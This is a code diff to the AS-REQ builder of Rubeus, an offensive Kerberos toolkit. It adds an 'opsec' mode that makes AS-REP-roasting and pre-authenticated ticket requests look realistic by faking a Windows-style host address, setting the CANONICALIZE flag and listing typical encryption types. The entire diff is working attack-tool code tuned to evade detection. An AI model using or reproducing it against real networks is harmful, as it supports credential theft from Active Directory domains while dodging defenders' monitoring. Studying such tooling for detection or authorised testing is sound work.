@@ -2,6 +2,7 @@
 using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Net;
 
 namespace Rubeus
 {
@@ -18,12 +19,12 @@ namespace Rubeus
     
     public class AS_REQ
     {
-        public static byte[] NewASReq(string userName, string domain, Interop.KERB_ETYPE etype)
+        public static byte[] NewASReq(string userName, string domain, Interop.KERB_ETYPE etype, bool opsec = false)
         {
             // build a new AS-REQ for the given userName, domain, and etype, but no PA-ENC-TIMESTAMP
             //  used for AS-REP-roasting
 
-            AS_REQ req = new AS_REQ();
+            AS_REQ req = new AS_REQ(opsec);
 
             // set the username to roast
             req.req_body.cname.name_string.Add(userName);
@@ -37,19 +38,40 @@ namespace Rubeus
             req.req_body.sname.name_string.Add("krbtgt");
             req.req_body.sname.name_string.Add(domain);
 
-            // add in our encryption type
-            req.req_body.etypes.Add(etype);
+            // try to build a realistic request
+            if (opsec)
+            {
+                string hostName = Dns.GetHostName();
+                // for some reason it wouldn't work without being uppercase and having 7 spaces on the end
+                hostName = string.Format("{0}       ", hostName.ToUpper());
+                List<HostAddress> addresses = new List<HostAddress>();
+                addresses.Add(new HostAddress(hostName));
+                req.req_body.addresses = addresses;
+                req.req_body.kdcOptions = req.req_body.kdcOptions | Interop.KdcOptions.CANONICALIZE;
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.aes256_cts_hmac_sha1);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac_exp);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.old_exp);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.des_cbc_md5);
+
+            }
+            else
+            {
+                // add in our encryption type
+                req.req_body.etypes.Add(etype);
+            }
 
             return req.Encode().Encode();
         }
 
-        public static byte[] NewASReq(string userName, string domain, string keyString, Interop.KERB_ETYPE etype)
+        public static byte[] NewASReq(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, bool opsec = false)
         {
             // build a new AS-REQ for the given userName, domain, and etype, w/ PA-ENC-TIMESTAMP
             //  used for "legit" AS-REQs w/ pre-auth
 
             // set pre-auth
-            AS_REQ req = new AS_REQ(keyString, etype);
+            AS_REQ req = new AS_REQ(keyString, etype, opsec);
             
             // req.padata.Add()
 
@@ -65,13 +87,27 @@ namespace Rubeus
             req.req_body.sname.name_string.Add("krbtgt");
             req.req_body.sname.name_string.Add(domain);
 
-            // add in our encryption type
-            req.req_body.etypes.Add(etype);
+            // try to build a realistic request
+            if (opsec)
+            {
+                req.req_body.kdcOptions = req.req_body.kdcOptions | Interop.KdcOptions.CANONICALIZE;
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.aes256_cts_hmac_sha1);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac_exp);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.old_exp);
+                req.req_body.etypes.Add(Interop.KERB_ETYPE.des_cbc_md5);
+            }
+            else
+            {
+                // add in our encryption type
+                req.req_body.etypes.Add(etype);
+            }
 
             return req.Encode().Encode();
         }
 
-        public AS_REQ()
+        public AS_REQ(bool opsec = false)
         {
             // default, for creation
             pvno = 5;
@@ -80,10 +116,10 @@ namespace Rubeus
             padata = new List<PA_DATA>();
             padata.Add(new PA_DATA());
 
-            req_body = new KDCReqBody();
+            req_body = new KDCReqBody(true, opsec);
         }
 
-        public AS_REQ(string keyString, Interop.KERB_ETYPE etype)
+        public AS_REQ(string keyString, Interop.KERB_ETYPE etype, bool opsec = false)
         {
             // default, for creation
             pvno = 5;
@@ -97,7 +133,7 @@ namespace Rubeus
             // add the include-pac == true
             padata.Add(new PA_DATA());
             
-            req_body = new KDCReqBody();
+            req_body = new KDCReqBody(true, opsec);
         }
 
         public AS_REQ(byte[] data)
